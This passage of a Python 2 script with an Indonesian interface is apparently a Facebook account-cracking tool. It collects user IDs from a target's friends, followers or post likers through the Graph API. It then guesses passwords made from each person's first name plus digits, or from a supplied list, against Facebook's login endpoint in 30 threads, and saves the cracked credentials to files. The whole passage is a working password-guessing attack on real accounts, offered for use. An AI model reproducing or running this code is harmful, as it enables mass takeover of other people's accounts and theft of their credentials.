    print ' [4] Lihat Hasil Crack'
    print ' \x1b[0;97m[\x1b[0;91m0\x1b[0;97m] Logout (hapus token)'
    pilih_menubapi()


def pilih_menubapi():
    ask = raw_input('\n [•] Choose : ')
    if ask == '':
        print ' [•] Pilih Yang Bener !'
        exit()
    elif ask == '1' or ask == '01':
        print "\n [•] Isi 'me' Jika Ingin Crack Dari List Teman"
        idt = raw_input(' [•] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [•] Nama : ' + sp['name']
        except KeyError:
            print ' [•] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '2' or ask == '02':
        print "\n [•] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input(' [•] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [•] Nama : ' + sp['name']
        except KeyError:
            print ' [•] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '3' or ask == '03':
        print '\n [•] Mikan ID Postingan'
        idt = raw_input(' [+] ID Post : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '4' or ask == '04':
        print '\n [1] Hasil OK '
        print ' [2] Hasil CP '
        ress = raw_input('\n [•] Choose : ')
        if ress == '':
            menu()
        elif ress == '1' or ress == '01':
            print '\n [•] ────────────────────────────────────────────��┤'
            print '\n [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '2' or ress == '02':
            print '\n [•] ────────────────────────────────────────────��┤'
            print ' [+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit(' [•] Pilih Yang Bener !')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print ' [•] Berhasil Menghapus Token'
        exit()
    else:
        print ' [•] Pilih Yang Bener !'
        exit()
    ask = raw_input(' [•] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualbapi()
    print ' [•] Total ID : ' + str(len(id))
    print ' [•] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print '\r \x1b[0;97m[•] [Berjalan] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
            	ua_apim = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': pw, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_apim)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r  \x1b[0;92m=> ' + uid + ' | ' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print '\r  \x1b[0;93m=> ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [•] Sudah Selesai Gass Follow'
    exit()


def manualbapi():
    print '\n [•] Masukan Password Contoh : sayang,rahasia,123456'
    pw = raw_input(' [•] Set Password : ').split(',')
    if len(pw) == 0:
        exit(' [•] Isi Yang Bener, Tidak Boleh Kosong')
    print ' [•] Total ID : ' + str(len(id))
    print ' [•] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print '\r \x1b[0;97m[•] [Berjalan] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
            	ua_apim = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': asu, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_apim)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r  \x1b[0;92m=> ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print '\r  \x1b[0;93m=> ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [•] Sudah Slesai Gass Follow'
    exit()


if __name__ == '__main__':
    os.system('clear')
    print logo
    tokenz()